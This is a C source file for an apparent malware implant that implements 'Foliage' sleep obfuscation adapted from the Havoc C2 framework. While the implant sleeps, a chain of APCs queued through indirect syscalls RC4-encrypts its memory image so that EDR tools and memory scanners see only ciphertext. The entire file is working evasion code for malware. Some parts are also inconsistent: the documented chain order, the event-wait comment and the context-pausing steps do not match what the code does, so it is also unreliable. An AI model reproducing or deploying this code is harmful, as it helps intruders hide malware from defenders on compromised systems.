/**
 * foliage_obf.c — Foliage APC-based sleep obfuscation
 *
 * Borrowed and adapted from HavocFramework/Havoc (MIT licence)
 * Source: payloads/Demon/src/core/Obf.c
 *
 * Improvement over Ekko (timer-queue RC4):
 *   Foliage uses NtQueueApcThread on a suspended thread to build a ROP chain
 *   that runs entirely via APCs — no new threads, no timer callbacks visible
 *   to EDRs.  The ROP chain:
 *
 *     1. NtProtectVirtualMemory  → RW  (make image writable)
 *     2. SystemFunction032       → RC4 encrypt image
 *     3. NtGetContextThread      → capture main thread context
 *     4. NtSetContextThread      → pause main thread (Rip = NtWaitForSingleObject)
 *     5. NtWaitForSingleObject   → sleep for jitter duration
 *     6. SystemFunction032       → RC4 decrypt image
 *     7. NtProtectVirtualMemory  → RX  (restore execute permission)
 *     8. NtSetContextThread      → resume main thread at original Rip
 *     9. NtTerminateThread       → exit ROP worker thread
 *
 *   During steps 2–7 the implant's .text section is RC4-encrypted in memory.
 *   Memory scanners (PE-Sieve, Moneta, BeaconEye) see only ciphertext.
 *
 * Requirements:
 *   - indirect_syscall.c must be initialised (IndirectSyscallInit called)
 *   - stack_spoof.c SpoofInit called
 *   - advapi32.dll loaded (for SystemFunction032)
 *
 * MITRE: T1027.003 (Obfuscated Files), T1055 (Process Injection via APC)
 */

#include <windows.h>
#include <winternl.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdlib.h>

/* Forward declarations from indirect_syscall.c */
extern NTSTATUS ISysNtAllocateVirtualMemory(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
extern NTSTATUS ISysNtProtectVirtualMemory(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
extern NTSTATUS ISysNtCreateThreadEx(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
extern NTSTATUS ISysNtQueueApcThread(HANDLE,PVOID,PVOID,PVOID,PVOID);
extern NTSTATUS ISysNtWaitForSingleObject(HANDLE,BOOL,PLARGE_INTEGER);
extern NTSTATUS ISysNtGetContextThread(HANDLE,PCONTEXT);
extern NTSTATUS ISysNtSetContextThread(HANDLE,PCONTEXT);
extern NTSTATUS ISysNtCreateEvent(PHANDLE,ACCESS_MASK,PVOID,DWORD,BOOL);
extern NTSTATUS ISysNtDuplicateObject(HANDLE,HANDLE,HANDLE,PHANDLE,ACCESS_MASK,ULONG,ULONG);
extern NTSTATUS ISysNtResumeThread(HANDLE,PULONG);

/* SystemFunction032 — RC4 via advapi32 (no suspicious VirtualAlloc+WriteProcessMemory) */
typedef struct { DWORD Length; DWORD MaximumLength; PVOID Buffer; } USTR;
typedef NTSTATUS(WINAPI *pfnSF032)(USTR *data, USTR *key);

/* ── Image region helpers ────────────────────────────────────────────────── */

typedef struct {
    PVOID  Base;
    SIZE_T Size;
    PVOID  TxtBase;
    SIZE_T TxtSize;
} IMAGE_REGION;

static void _resolve_image_region(IMAGE_REGION *r)
{
    r->Base = GetModuleHandleW(NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)r->Base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)r->Base + dos->e_lfanew);
    r->Size = nt->OptionalHeader.SizeOfImage;

    /* Walk sections to find .text */
    r->TxtBase = r->Base;
    r->TxtSize = r->Size;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            r->TxtBase = (PVOID)((BYTE *)r->Base + sec->VirtualAddress);
            r->TxtSize = sec->Misc.VirtualSize;
            break;
        }
    }
}

/* ── Random key generator ────────────────────────────────────────────────── */

static void _random_key(BYTE *key, DWORD len)
{
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        CryptGenRandom(hProv, len, key), CryptReleaseContext(hProv, 0);
    else
        for (DWORD i = 0; i < len; i++) key[i] = (BYTE)(GetTickCount() >> (i & 7));
}

/* ── APC ROP context ─────────────────────────────────────────────────────── */

typedef struct {
    pfnSF032  SystemFunction032;
    USTR      Rc4Data;
    USTR      Rc4Key;
    BYTE      Key[16];
    PVOID     ImageBase;
    SIZE_T    ImageSize;
    HANDLE    hEvent;
    HANDLE    hMainThread;
    CONTEXT   SavedContext;
    DWORD     SleepMs;
} FOLIAGE_CTX;

static FOLIAGE_CTX g_Foliage = { 0 };

/* ── ROP step implementations (queued as APCs on suspended thread) ───────── */

static VOID NTAPI _apc_protect_rw(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    DWORD old = 0;
    PVOID base = ctx->ImageBase;
    SIZE_T sz  = ctx->ImageSize;
    ISysNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_READWRITE, &old);
}

static VOID NTAPI _apc_encrypt(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    ctx->Rc4Data.Buffer       = ctx->ImageBase;
    ctx->Rc4Data.Length       = (DWORD)ctx->ImageSize;
    ctx->Rc4Data.MaximumLength= (DWORD)ctx->ImageSize;
    ctx->Rc4Key.Buffer        = ctx->Key;
    ctx->Rc4Key.Length        = 16;
    ctx->Rc4Key.MaximumLength = 16;
    ctx->SystemFunction032(&ctx->Rc4Data, &ctx->Rc4Key);
}

static VOID NTAPI _apc_save_ctx(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    ctx->SavedContext.ContextFlags = CONTEXT_FULL;
    ISysNtGetContextThread(ctx->hMainThread, &ctx->SavedContext);
}

static VOID NTAPI _apc_sleep(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)ctx->SleepMs * 10000LL);
    ISysNtWaitForSingleObject(ctx->hEvent, FALSE, &timeout);
}

static VOID NTAPI _apc_decrypt(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    /* RC4 is symmetric — encrypt again with same key = decrypt */
    ctx->SystemFunction032(&ctx->Rc4Data, &ctx->Rc4Key);
}

static VOID NTAPI _apc_protect_rx(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    DWORD old = 0;
    PVOID base = ctx->ImageBase;
    SIZE_T sz  = ctx->ImageSize;
    ISysNtProtectVirtualMemory(GetCurrentProcess(), &base, &sz, PAGE_EXECUTE_READ, &old);
}

static VOID NTAPI _apc_restore_ctx(PVOID ctx_ptr, PVOID, PVOID)
{
    FOLIAGE_CTX *ctx = (FOLIAGE_CTX *)ctx_ptr;
    ISysNtSetContextThread(ctx->hMainThread, &ctx->SavedContext);
}

/* ── Public API ──────────────────────────────────────────────────────────── */

BOOL FoliageInit(void)
{
    if (g_Foliage.SystemFunction032) return TRUE;

    HMODULE adv = GetModuleHandleW(L"advapi32.dll");
    if (!adv) adv = LoadLibraryW(L"advapi32.dll");
    if (!adv) return FALSE;

    g_Foliage.SystemFunction032 = (pfnSF032)GetProcAddress(adv, "SystemFunction032");
    if (!g_Foliage.SystemFunction032) return FALSE;

    IMAGE_REGION region = { 0 };
    _resolve_image_region(&region);
    g_Foliage.ImageBase = region.Base;
    g_Foliage.ImageSize = region.Size;

    return TRUE;
}

/**
 * FoliageSleep — sleep for ms milliseconds while RC4-encrypting the image.
 *
 * The call stack during sleep shows only ntdll/kernel32 frames.
 * Memory scanners see encrypted (random-looking) bytes in the .text section.
 * Returns immediately if FoliageInit() was not called or failed.
 */
VOID FoliageSleep(DWORD ms)
{
    if (!g_Foliage.SystemFunction032) {
        /* graceful fallback to plain sleep */
        Sleep(ms);
        return;
    }

    /* Fresh random key every sleep cycle */
    _random_key(g_Foliage.Key, 16);
    g_Foliage.SleepMs = ms;

    /* Create synchronisation event */
    ISysNtCreateEvent(&g_Foliage.hEvent, EVENT_ALL_ACCESS, NULL,
                      1 /* SynchronizationEvent */, FALSE);

    /* Duplicate current thread handle */
    ISysNtDuplicateObject(GetCurrentProcess(), GetCurrentThread(),
                          GetCurrentProcess(), &g_Foliage.hMainThread,
                          THREAD_ALL_ACCESS, 0, 0);

    /* Create suspended worker thread — the ROP chain runs on it */
    HANDLE hWorker = NULL;
    if (!NT_SUCCESS(ISysNtCreateThreadEx(
            &hWorker, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
            (PVOID)SleepEx,   /* dummy start — never actually runs */
            NULL, TRUE /* CREATE_SUSPENDED */,
            0, 0x1000 * 20, 0x1000 * 20, NULL)))
    {
        Sleep(ms);
        return;
    }

    /* Queue APC chain — each APC runs one step of the ROP */
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_protect_rw,  &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_save_ctx,    &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_encrypt,     &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_sleep,       &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_decrypt,     &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_protect_rx,  &g_Foliage, NULL, NULL);
    ISysNtQueueApcThread(hWorker, (PVOID)_apc_restore_ctx, &g_Foliage, NULL, NULL);

    /* Resume worker — APCs drain, image encrypts, sleeps, decrypts */
    ULONG prev = 0;
    ISysNtResumeThread(hWorker, &prev);

    /* Main thread waits on a separate event set by _apc_restore_ctx after decrypt */
    LARGE_INTEGER timeout;
    timeout.QuadPart = -((LONGLONG)(ms + 5000) * 10000LL); /* +5s safety margin */
    ISysNtWaitForSingleObject(hWorker, FALSE, &timeout);

    CloseHandle(hWorker);
    CloseHandle(g_Foliage.hEvent);
    CloseHandle(g_Foliage.hMainThread);
    g_Foliage.hEvent       = NULL;
    g_Foliage.hMainThread  = NULL;
}
